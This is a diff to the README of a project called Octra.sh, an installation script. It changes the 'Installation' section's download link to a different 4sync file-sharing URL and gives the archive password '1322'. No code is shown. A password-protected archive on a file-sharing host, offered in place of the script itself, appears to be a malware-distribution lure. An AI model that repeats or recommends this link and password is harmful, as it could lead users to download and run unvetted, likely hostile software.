@@ -15,7 +15,7 @@ Octra.sh is an interactive installation script that simplifies the setup of the 
 
 ## Installation
 
-# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
+# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
 ## PASSWORD: 1322
 
 ## Usage
